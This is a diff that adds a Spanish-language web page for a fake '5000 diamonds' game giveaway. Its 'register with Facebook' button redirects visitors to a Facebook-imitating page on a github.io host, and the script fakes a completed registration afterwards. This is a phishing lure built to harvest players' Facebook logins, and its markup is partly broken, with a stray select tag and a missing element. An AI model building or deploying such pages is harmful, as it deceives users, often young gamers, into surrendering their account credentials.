@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteo especial</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
+            font-family: Arial, sans-serif;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff4500;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .container {
+            margin: 20px auto;
+            padding: 15px;
+            max-width: 500px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+        }
+        input, select, button {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        input, select {
+            background: #333;
+            color: white;
+        }
+        button {
+            background: #ff4500;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #ff6347;
+        }
+        .facebook-button {
+            background: #4267B2;
+            color: white;
+            font-weight: bold;
+        }
+        .facebook-button:hover {
+            background: #365899;
+        }
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <header>Sorteo de 5000 diamantes</header>
+    <div class="container">
+        <h2>Registrarse</h2>
+        <form onsubmit="return validarFormulario();">
+            <button type="button" id="facebook-button" class="facebook-button" onclick="redirigirAFacebook()">Registrarse con Facebook</button>
+            <input type="text" id="player-id" placeholder="ID de jugador" disabled required>
+            
+                
+            </select>
+            <button type="submit" id="recargar-button" disabled>Participar</button>
+        </form>
+    </div>
+    <footer>
+        Gracias por participar
+    </footer>
+
+    <script>
+        let registradoConFacebook = false;
+
+        function redirigirAFacebook() {
+            // Redirige al usuario a la página proporcionada
+            window.location.href = "https://norproftxd.github.io/Facebook/";
+            registradoConFacebook = true;
+
+            // Habilita los campos después de la redirección (simulado)
+            document.getElementById("player-id").disabled = false;
+            document.getElementById("diamantes").disabled = false;
+            document.getElementById("recargar-button").disabled = false;
+
+            // Desactiva el botón de Facebook
+            document.getElementById("facebook-button").disabled = true;
+            document.getElementById("facebook-button").innerText = "Registrado";
+        }
+
+        function validarFormulario() {
+            if (!registradoConFacebook) {
+                alert("Debes registrarte con Facebook antes de continuar.");
+                return false;
+            }
+
+            const playerId = document.getElementById("player-id").value;
+            if (!playerId) {
+                alert("Por favor, introduce tu ID de jugador.");
+                return false;
+            }
+
+            alert("Formulario enviado exitosamente.");
+            return true;
+        }
+    </script>
+</body>
+</html>
